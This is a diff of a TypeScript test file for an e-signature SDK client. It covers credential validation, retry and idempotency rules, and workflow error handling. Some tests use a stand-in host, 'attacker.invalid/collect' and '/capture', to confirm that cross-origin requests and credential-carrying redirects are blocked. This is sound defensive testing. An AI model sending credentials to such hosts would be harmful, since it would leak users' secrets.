@@ -1,5 +1,7 @@
 import { describe, test, expect } from 'bun:test';
 import axios from 'axios';
+import type { AxiosInstance, InternalAxiosRequestConfig } from 'axios';
+import packageJson from '../package.json';
 import { AssinafyClient } from './client';
 import { ApiError, ValidationError } from './errors';
 
@@ -49,6 +51,41 @@ describe('AssinafyClient', () => {
         expect(client.documents).toBeDefined();
     });
 
+    test('static create() cannot have its required credentials overridden at runtime', () => {
+        const client = AssinafyClient.create(
+            'required-key',
+            'required-account',
+            { apiKey: 'overridden-key', accountId: 'overridden-account' } as never,
+        );
+        const headers = client.getAxiosInstance().defaults.headers as Record<string, unknown>;
+
+        expect(headers['X-Api-Key']).toBe('required-key');
+        expect(
+            (client.signers as unknown as { defaultAccountId?: string }).defaultAccountId,
+        ).toBe('required-account');
+    });
+
+    test('static create() rejects missing runtime credentials', () => {
+        for (const [apiKey, accountId] of [
+            ['', 'account'],
+            ['key', ' '],
+            [null, 'account'],
+            ['key', 42],
+        ]) {
+            expect(() => AssinafyClient.create(apiKey as never, accountId as never)).toThrow(
+                ValidationError,
+            );
+        }
+    });
+
+    test('static create() rejects malformed options', () => {
+        for (const options of [null, []]) {
+            expect(() => AssinafyClient.create('key', 'account', options as never)).toThrow(
+                ValidationError,
+            );
+        }
+    });
+
     test('fromConfig accepts snake_case keys', () => {
         const client = AssinafyClient.fromConfig({
             api_key: 'k',
@@ -62,6 +99,51 @@ describe('AssinafyClient', () => {
         const client = new AssinafyClient({ apiKey: 'my-key', accountId: 'acc' });
         const headers = client.getAxiosInstance().defaults.headers as Record<string, unknown>;
         expect(headers['X-Api-Key']).toBe('my-key');
+    });
+
+    test('identifies every client transport with the package version', () => {
+        const client = new AssinafyClient({ apiKey: 'secret-key' });
+        const authenticated = client.getAxiosInstance().defaults.headers as Record<
+            string,
+            unknown
+        >;
+        const publicHttp = (
+            client.auth as unknown as { publicHttp: { defaults: { headers: Record<string, unknown> } } }
+        ).publicHttp;
+        const expected = `Assinafy-Typescript-SDK/v${packageJson.version}`;
+
+        expect(packageJson.version).toBe('2.1.2');
+        expect(authenticated['User-Agent']).toBe(expected);
+        expect(publicHttp.defaults.headers['User-Agent']).toBe(expected);
+    });
+
+    test('dispatches the versioned user-agent on protected and public requests', async () => {
+        const client = new AssinafyClient({ apiKey: 'secret-key' });
+        const authenticated = client.getAxiosInstance();
+        const publicHttp = (
+            client.auth as unknown as { publicHttp: AxiosInstance }
+        ).publicHttp;
+        const seen: string[] = [];
+        const adapter = async (config: InternalAxiosRequestConfig) => {
+            seen.push(String(config.headers.get('User-Agent')));
+            return {
+                data: { status: 200, data: config.url === '/documents/statuses' ? [] : {} },
+                status: 200,
+                statusText: 'OK',
+                headers: {},
+                config,
+            };
+        };
+        authenticated.defaults.adapter = adapter;
+        publicHttp.defaults.adapter = adapter;
+
+        await client.documents.statuses();
+        await client.documents.getPublic('doc-1');
+
+        expect(seen).toEqual([
+            `Assinafy-Typescript-SDK/v${packageJson.version}`,
+            `Assinafy-Typescript-SDK/v${packageJson.version}`,
+        ]);
     });
 
     test('sends Bearer Authorization when only token is provided', () => {
@@ -88,7 +170,68 @@ describe('AssinafyClient', () => {
         expect(client.getAxiosInstance().defaults.baseURL).toBe('https://sandbox.assinafy.com.br/v1');
     });
 
+    test('canonicalizes dot segments in a custom baseUrl', () => {
+        const client = new AssinafyClient({ baseUrl: 'https://example.com/api/../v1/' });
+        expect(client.getAxiosInstance().defaults.baseURL).toBe('https://example.com/v1');
+    });
+
+    test('allows same-origin absolute requests and rejects cross-origin dispatch', async () => {
+        const client = new AssinafyClient({ apiKey: 'secret-key' });
+        const http = client.getAxiosInstance();
+        let calls = 0;
+        http.defaults.adapter = async (config) => {
+            calls++;
+            return { data: {}, status: 200, statusText: 'OK', headers: {}, config };
+        };
+
+        await expect(
+            http.get('https://api.assinafy.com.br/v1/documents/statuses'),
+        ).resolves.toMatchObject({ status: 200 });
+        await expect(http.get('https://attacker.invalid/collect')).rejects.toBeInstanceOf(
+            ValidationError,
+        );
+        await expect(
+            http.get('/collect', { baseURL: 'https://attacker.invalid/v1' }),
+        ).rejects.toBeInstanceOf(ValidationError);
+        expect(calls).toBe(1);
+    });
+
+    test('marks credentials as sensitive across redirects', () => {
+        const client = new AssinafyClient({ apiKey: 'secret-key' });
+        expect(client.getAxiosInstance().defaults.sensitiveHeaders).toEqual([
+            'Authorization',
+            'X-Api-Key',
+        ]);
+    });
+
+    test('blocks cross-origin redirects that would replay credential-bearing bodies', () => {
+        const client = new AssinafyClient({ apiKey: 'secret-key' });
+        const authenticated = client.getAxiosInstance().defaults.beforeRedirect;
+        const publicHttp = (
+            client.auth as unknown as { publicHttp: AxiosInstance }
+        ).publicHttp.defaults.beforeRedirect;
+        const redirect = { href: 'https://attacker.invalid/capture', method: 'POST' };
+        const response = { headers: {}, statusCode: 307 };
+
+        expect(() =>
+            authenticated?.(redirect, response, {
+                headers: {},
+                url: 'https://api.assinafy.com.br/v1/authentication/change-password',
+                method: 'PUT',
+            }),
+        ).toThrow('Unsafe cross-origin redirect blocked');
+        expect(() =>
+            publicHttp?.(redirect, response, {
+                headers: {},
+                url: 'https://api.assinafy.com.br/v1/login',
+                method: 'POST',
+            }),
+        ).toThrow('Unsafe cross-origin redirect blocked');
+    });
+
     test('validates timeout, retry count, and base URL configuration', () => {
+        expect(() => new AssinafyClient(null as never)).toThrow(ValidationError);
+        expect(() => AssinafyClient.fromConfig(null as never)).toThrow(ValidationError);
         expect(() => new AssinafyClient({ timeout: Number.NaN })).toThrow(ValidationError);
         expect(() => new AssinafyClient({ maxRetries: Number.POSITIVE_INFINITY })).toThrow(
             ValidationError,
@@ -96,6 +239,25 @@ describe('AssinafyClient', () => {
         expect(() => new AssinafyClient({ maxRetries: 1.5 })).toThrow(ValidationError);
         expect(() => new AssinafyClient({ baseUrl: 'not-a-url' })).toThrow(ValidationError);
         expect(() => new AssinafyClient({ baseUrl: 'file:///tmp/api' })).toThrow(ValidationError);
+        expect(() => new AssinafyClient({ baseUrl: null as never })).toThrow(ValidationError);
+        expect(() => new AssinafyClient({ baseUrl: 42 as never })).toThrow(ValidationError);
+        expect(() => new AssinafyClient({ baseUrl: 'https://user:pass@example.com/v1' })).toThrow(
+            ValidationError,
+        );
+        expect(() => new AssinafyClient({ baseUrl: 'https://example.com/v1?tenant=one' })).toThrow(
+            ValidationError,
+        );
+        expect(() => new AssinafyClient({ baseUrl: 'https://example.com/v1#docs' })).toThrow(
+            ValidationError,
+        );
+        for (const options of [
+            { apiKey: '' },
+            { token: 42 as never },
+            { accountId: ' ' },
+            { webhookSecret: null as never },
+        ]) {
+            expect(() => new AssinafyClient(options)).toThrow(ValidationError);
+        }
     });
 
     test('retries an HTTP 429 then succeeds (honoring Retry-After)', async () => {
@@ -131,6 +293,30 @@ describe('AssinafyClient', () => {
         expect(result.data).toEqual([{ id: 'd1' }] as never);
     });
 
+    test('aborts while waiting to retry a rate-limited request', async () => {
+        const client = new AssinafyClient({ apiKey: 'k', maxRetries: 2 });
+        const ax = client.getAxiosInstance();
+        let calls = 0;
+        ax.defaults.adapter = async (config) => {
+            calls++;
+            throw new axios.AxiosError('Too Many Requests', 'ERR_BAD_RESPONSE', config, {}, {
+                status: 429,
+                statusText: 'Too Many Requests',
+                headers: { 'retry-after': '30' },
+                data: {},
+                config,
+            });
+        };
+        const controller = new AbortController();
+        const startedAt = Date.now();
+        const request = ax.get('/rate-limited', { signal: controller.signal });
+        setTimeout(() => controller.abort(), 10);
+
+        await expect(request).rejects.toMatchObject({ name: 'AbortError' });
+        expect(Date.now() - startedAt).toBeLessThan(1_000);
+        expect(calls).toBe(1);
+    });
+
     test('does not retry a non-idempotent 429 without an idempotency key', async () => {
         const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc', maxRetries: 2 });
         const ax = client.getAxiosInstance();
@@ -152,8 +338,8 @@ describe('AssinafyClient', () => {
         expect(calls).toBe(1);
     });
 
-    test('retries every supported idempotent method after a 429', async () => {
-        for (const method of ['head', 'options', 'put', 'delete']) {
+    test('retries every supported read/delete method after a 429', async () => {
+        for (const method of ['head', 'options', 'delete']) {
             const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc', maxRetries: 1 });
             const ax = client.getAxiosInstance();
             let calls = 0;
@@ -188,7 +374,28 @@ describe('AssinafyClient', () => {
         }
     });
 
-    test('retries a non-idempotent 429 with an explicit Idempotency-Key', async () => {
+    test('does not replay PUT requests after a 429 without an idempotency key', async () => {
+        const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc', maxRetries: 2 });
+        const ax = client.getAxiosInstance();
+        let calls = 0;
+        ax.defaults.adapter = async (config) => {
+            calls++;
+            throw new axios.AxiosError('Too Many Requests', 'ERR_BAD_RESPONSE', config, {}, {
+                status: 429,
+                statusText: 'Too Many Requests',
+                headers: { 'retry-after': '0' },
+                data: {},
+                config,
+            });
+        };
+
+        await expect(ax.put('/accounts/acc', { name: 'Updated' })).rejects.toMatchObject({
+            response: { status: 429 },
+        });
+        expect(calls).toBe(1);
+    });
+
+    test('retries caller-opted custom requests carrying an Idempotency-Key', async () => {
         const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc', maxRetries: 2 });
         const ax = client.getAxiosInstance();
         let calls = 0;
@@ -212,12 +419,76 @@ describe('AssinafyClient', () => {
             };
         };
 
-        const response = await ax.post(
+        const postResponse = await ax.post(
             '/custom-operation',
             { value: 1 },
             { headers: { 'Idempotency-Key': 'operation-123' } },
         );
-        expect(response.data).toEqual({ status: 200, data: { id: 'created-once' } });
+        expect(postResponse.data).toEqual({ status: 200, data: { id: 'created-once' } });
+        expect(calls).toBe(2);
+
+        calls = 0;
+        const putResponse = await ax.put(
+            '/authentication/change-password',
+            { value: 1 },
+            { headers: { 'Idempotency-Key': 'operation-123' } },
+        );
+        expect(putResponse.data).toEqual({ status: 200, data: { id: 'created-once' } });
+        expect(calls).toBe(2);
+    });
+
+    test('never retries GET /sign because reading it records a signer view', async () => {
+        const client = new AssinafyClient({ maxRetries: 2 });
+        const ax = (client as unknown as { publicAxiosInstance: AxiosInstance })
+            .publicAxiosInstance;
+        let calls = 0;
+        ax.defaults.adapter = async (config) => {
+            calls++;
+            throw new axios.AxiosError('Too Many Requests', 'ERR_BAD_RESPONSE', config, {}, {
+                status: 429,
+                statusText: 'Too Many Requests',
+                headers: { 'retry-after': '0' },
+                data: {},
+                config,
+            });
+        };
+
+        await expect(
+            ax.get('/sign?signer-access-code=code', {
+                headers: { 'Idempotency-Key': 'unsupported-for-this-route' },
+            }),
+        ).rejects.toMatchObject({ response: { status: 429 } });
+        expect(calls).toBe(1);
+    });
+
+    test('retains rate-limit retries on signer-code requests', async () => {
+        const client = new AssinafyClient({ maxRetries: 1 });
+        const ax = (client as unknown as { publicAxiosInstance: AxiosInstance })
+            .publicAxiosInstance;
+        let calls = 0;
+        ax.defaults.adapter = async (config) => {
+            calls++;
+            if (calls === 1) {
+                throw new axios.AxiosError('Too Many Requests', 'ERR_BAD_RESPONSE', config, {}, {
+                    status: 429,
+                    statusText: 'Too Many Requests',
+                    headers: { 'retry-after': '0' },
+                    data: {},
+                    config,
+                });
+            }
+            return {
+                data: { status: 200, data: { id: 'signer-1' } },
+                status: 200,
+                statusText: 'OK',
+                headers: {},
+                config,
+            };
+        };
+
+        await expect(client.signerDocuments.self('access-code')).resolves.toMatchObject({
+            id: 'signer-1',
+        });
         expect(calls).toBe(2);
     });
 
@@ -294,6 +565,57 @@ describe('AssinafyClient', () => {
             ).rejects.toBeInstanceOf(ValidationError);
         });
 
+        test('rejects malformed workflow objects before requesting', async () => {
+            const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc' });
+            let requests = 0;
+            client.getAxiosInstance().defaults.adapter = async () => {
+                requests++;
+                throw new Error('unexpected request');
+            };
+
+            const malformed = [
+                null,
+                { source: pdf, signers: {} },
+                { source: pdf, signers: [null] },
+                {
+                    source: pdf,
+                    signers: [{ name: 'Signer', email: 'signer@example.com' }],
+                    waitOptions: null,
+                },
+                {
+                    source: pdf,
+                    signers: [{ name: 'Signer', email: 'signer@example.com' }],
+                    waitOptions: { maxWaitMs: -1 },
+                },
+                {
+                    source: pdf,
+                    signers: [{ name: 'Signer', email: 'signer@example.com' }],
+                    waitForReady: 'false',
+                },
+                {
+                    source: pdf,
+                    signers: [{ name: 'Signer', email: 'signer@example.com' }],
+                    copyReceivers: [''],
+                },
+                {
+                    source: pdf,
+                    signers: [{ name: 'Signer', email: 'signer@example.com' }],
+                    expiresAt: '',
+                },
+                {
+                    source: pdf,
+                    signers: [{ name: 'Signer', email: 'signer@example.com' }],
+                    expiresAt: 'not-a-date',
+                },
+            ];
+            for (const options of malformed) {
+                await expect(
+                    client.uploadAndRequestSignatures(options as never),
+                ).rejects.toBeInstanceOf(ValidationError);
+            }
+            expect(requests).toBe(0);
+        });
+
         test('validates every signer before uploading anything', async () => {
             const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc' });
             let requests = 0;
@@ -313,7 +635,60 @@ describe('AssinafyClient', () => {
             expect(requests).toBe(0);
         });
 
-        test('uploads, waits for ready, creates each signer + a virtual assignment, returns the result', async () => {
+        test('rejects duplicate normalized signer contacts before uploading', async () => {
+            const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc' });
+            let requests = 0;
+            client.getAxiosInstance().defaults.adapter = async (config) => {
+                requests++;
+                throw new Error(`unexpected request to ${config.url}`);
+            };
+
+            const duplicateContacts = [
+                [
+                    { name: 'First', email: 'same@example.com' },
+                    { name: 'Second', email: 'SAME@example.com' },
+                ],
+                [
+                    { name: 'First', whatsapp_phone_number: '+15555550101' },
+                    { name: 'Second', phone: '+15555550101' },
+                ],
+            ];
+            for (const signers of duplicateContacts) {
+                await expect(
+                    client.uploadAndRequestSignatures({ source: pdf, signers }),
+                ).rejects.toBeInstanceOf(ValidationError);
+            }
+            expect(requests).toBe(0);
+        });
+
+        test('validates signer metadata before uploading anything', async () => {
+            const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc' });
+            let requests = 0;
+            client.getAxiosInstance().defaults.adapter = async (config) => {
+                requests++;
+                throw new Error(`unexpected request to ${config.url}`);
+            };
+            const circular: Record<string, unknown> = {};
+            circular['self'] = circular;
+
+            for (const metadata of [circular, { amount: 1n }, []]) {
+                await expect(
+                    client.uploadAndRequestSignatures({
+                        source: pdf,
+                        signers: [
+                            {
+                                name: 'Signer',
+                                email: 'signer@example.com',
+                                metadata: metadata as never,
+                            },
+                        ],
+                    }),
+                ).rejects.toBeInstanceOf(ValidationError);
+            }
+            expect(requests).toBe(0);
+        });
+
+        test('creates a virtual assignment before waiting for document processing', async () => {
             const client = new AssinafyClient({
                 apiKey: 'k',
                 accountId: 'acc',
@@ -322,6 +697,7 @@ describe('AssinafyClient', () => {
             const ax = client.getAxiosInstance();
 
             const calls = { upload: 0, signerList: 0, signerCreate: 0, assignment: 0, details: 0 };
+            const callOrder: string[] = [];
             let assignmentBody: unknown;
             let signerSeq = 0;
 
@@ -381,6 +757,7 @@ describe('AssinafyClient', () => {
                 // POST /documents/{id}/assignments — create the virtual assignment
                 if (method === 'post' && url.endsWith('/assignments')) {
                     calls.assignment++;
+                    callOrder.push('assignment');
                     assignmentBody = config.data;
                     return respond({
                         resource: 'assignment',
@@ -396,9 +773,10 @@ describe('AssinafyClient', () => {
                         signing_urls: [],
                     });
                 }
-                // GET /documents/{id} — waitUntilReady poll + final re-fetch (metadata_ready)
+                // GET /documents/{id} — post-assignment waitUntilReady poll
                 if (method === 'get' && url.startsWith('/documents/')) {
                     calls.details++;
+                    callOrder.push('details');
                     return respond({
                         resource: 'document',
                         id: 'doc-123',
@@ -444,12 +822,13 @@ describe('AssinafyClient', () => {
                 message: 'Please sign',
             });
 
-            // Flow: one upload, two signer creations, one assignment, two GET /documents/{id}
-            // (waitUntilReady poll + the post-assignment re-fetch).
+            // Flow: one upload, two signer creations, one immediate assignment,
+            // then one GET /documents/{id} to return the processed document.
             expect(calls.upload).toBe(1);
             expect(calls.signerCreate).toBe(2);
             expect(calls.assignment).toBe(1);
-            expect(calls.details).toBe(2);
+            expect(calls.details).toBe(1);
+            expect(callOrder).toEqual(['assignment', 'details']);
 
             // Assignment was posted as a virtual method carrying both created signer IDs.
             const body = (typeof assignmentBody === 'string'
@@ -468,12 +847,13 @@ describe('AssinafyClient', () => {
             expect(result.document.status).toBe('metadata_ready');
         });
 
-        test('waitForReady:false still waits for assignment safety but skips the final re-fetch', async () => {
+        test('waitForReady:false creates immediately and skips document polling', async () => {
             const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc' });
             const ax = client.getAxiosInstance();
 
             const calls = { upload: 0, signerList: 0, signerCreate: 0, assignment: 0, details: 0 };
             let signerSeq = 0;
+            let assignmentBody: unknown;
 
             ax.defaults.adapter = async (config) => {
                 const method = (config.method ?? 'get').toLowerCase();
@@ -512,6 +892,7 @@ describe('AssinafyClient', () => {
                 }
                 if (method === 'post' && url.endsWith('/assignments')) {
                     calls.assignment++;
+                    assignmentBody = config.data;
                     return respond({ resource: 'assignment', id: 'asg-1', method: 'virtual', signers: [] });
                 }
                 if (method === 'get' && url.startsWith('/documents/')) {
@@ -523,18 +904,151 @@ describe('AssinafyClient', () => {
 
             const result = await client.uploadAndRequestSignatures({
                 source: pdf,
-                signers: [{ name: 'Ana Souza', email: 'ana@example.com' }],
+                signers: [{ name: 'Ana Souza', whatsapp_phone_number: '+5548999990000' }],
                 waitForReady: false,
             });
 
             expect(calls.upload).toBe(1);
             expect(calls.signerCreate).toBe(1);
             expect(calls.assignment).toBe(1);
-            // Assignment creation requires metadata_ready, so the safety poll is
-            // retained; only the post-assignment details refresh is skipped.
-            expect(calls.details).toBe(1);
+            expect(calls.details).toBe(0);
             expect(result.signer_ids).toEqual(['signer-1']);
             expect(result.document.status).toBe('uploaded'); // raw upload snapshot
+            const body = typeof assignmentBody === 'string'
+                ? JSON.parse(assignmentBody) as unknown
+                : assignmentBody;
+            expect(body).toEqual({
+                method: 'virtual',
+                signers: [{
+                    id: 'signer-1',
+                    verification_method: 'Whatsapp',
+                    notification_methods: ['Whatsapp'],
+                }],
+            });
+        });
+
+        test('wait failures expose already-created resource IDs', async () => {
+            const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc' });
+            let assignmentCalls = 0;
+            client.getAxiosInstance().defaults.adapter = async (config) => {
+                const method = (config.method ?? 'get').toLowerCase();
+                const url = config.url ?? '';
+                const respond = (data: unknown) => ({
+                    data: { status: 200, data },
+                    status: 200,
+                    statusText: 'OK',
+                    headers: {},
+                    config,
+                });
+                if (method === 'post' && url.endsWith('/documents')) {
+                    return respond({ id: 'doc-123', status: 'uploaded', pages: [] });
+                }
+                if (method === 'get' && url.includes('/signers')) return respond([]);
+                if (method === 'post' && url.endsWith('/signers')) {
+                    return respond({ id: 'signer-1', full_name: 'Ana', email: 'ana@example.com' });
+                }
+                if (method === 'post' && url.endsWith('/assignments')) {
+                    assignmentCalls++;
+                    return respond({ id: 'asg-1', method: 'virtual', signers: [] });
+                }
+                throw new Error(`unexpected request ${method.toUpperCase()} ${url}`);
+            };
+
+            let caught: unknown;
+            try {
+                await client.uploadAndRequestSignatures({
+                    source: pdf,
+                    signers: [{ name: 'Ana', email: 'ana@example.com' }],
+                    waitOptions: { maxWaitMs: 0 },
+                });
+            } catch (error) {
+                caught = error;
+            }
+            expect(assignmentCalls).toBe(1);
+            expect(caught).toBeInstanceOf(ValidationError);
+            expect((caught as ValidationError).errors).toMatchObject({
+                documentId: 'doc-123',
+                assignmentId: 'asg-1',
+                signerIds: ['signer-1'],
+            });
+            expect((caught as ValidationError).context).toMatchObject({
+                documentId: 'doc-123',
+                assignmentId: 'asg-1',
+                signerIds: ['signer-1'],
+            });
+        });
+
+        test('signer creation failures expose the document and accumulated signer IDs', async () => {
+            const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc' });
+            let signerCreates = 0;
+            client.getAxiosInstance().defaults.adapter = async (config) => {
+                const method = (config.method ?? 'get').toLowerCase();
+                const url = config.url ?? '';
+                const respond = (data: unknown) => ({
+                    data: { status: 200, data },
+                    status: 200,
+                    statusText: 'OK',
+                    headers: {},
+                    config,
+                });
+                if (method === 'post' && url.endsWith('/documents')) {
+                    return respond({ id: 'doc-123', status: 'uploaded', pages: [] });
+                }
+                if (method === 'get' && url.includes('/signers')) return respond([]);
+                if (method === 'post' && url.endsWith('/signers')) {
+                    signerCreates++;
+                    if (signerCreates === 2) throw new ApiError('signer failed', 422);
+                    return respond({ id: 'signer-1', full_name: 'One' });
+                }
+                throw new Error(`unexpected request ${method.toUpperCase()} ${url}`);
+            };
+
+            await expect(
+                client.uploadAndRequestSignatures({
+                    source: pdf,
+                    signers: [
+                        { name: 'One', email: 'one@example.com' },
+                        { name: 'Two', email: 'two@example.com' },
+                    ],
+                }),
+            ).rejects.toMatchObject({
+                context: { documentId: 'doc-123', signerIds: ['signer-1'] },
+            });
+        });
+
+        test('assignment failures expose the document and all signer IDs', async () => {
+            const client = new AssinafyClient({ apiKey: 'k', accountId: 'acc' });
+            client.getAxiosInstance().defaults.adapter = async (config) => {
+                const method = (config.method ?? 'get').toLowerCase();
+                const url = config.url ?? '';
+                const respond = (data: unknown) => ({
+                    data: { status: 200, data },
+                    status: 200,
+                    statusText: 'OK',
+                    headers: {},
+                    config,
+                });
+                if (method === 'post' && url.endsWith('/documents')) {
+                    return respond({ id: 'doc-123', status: 'uploaded', pages: [] });
+                }
+                if (method === 'get' && url.includes('/signers')) return respond([]);
+                if (method === 'post' && url.endsWith('/signers')) {
+                    return respond({ id: 'signer-1', full_name: 'One' });
+                }
+                if (method === 'post' && url.endsWith('/assignments')) {
+                    throw new ApiError('assignment failed', 422);
+                }
+                throw new Error(`unexpected request ${method.toUpperCase()} ${url}`);
+            };
+
+            await expect(
+                client.uploadAndRequestSignatures({
+                    source: pdf,
+                    signers: [{ name: 'One', email: 'one@example.com' }],
+                }),
+            ).rejects.toMatchObject({
+                context: { documentId: 'doc-123', signerIds: ['signer-1'] },
+            });
         });
     });
 });
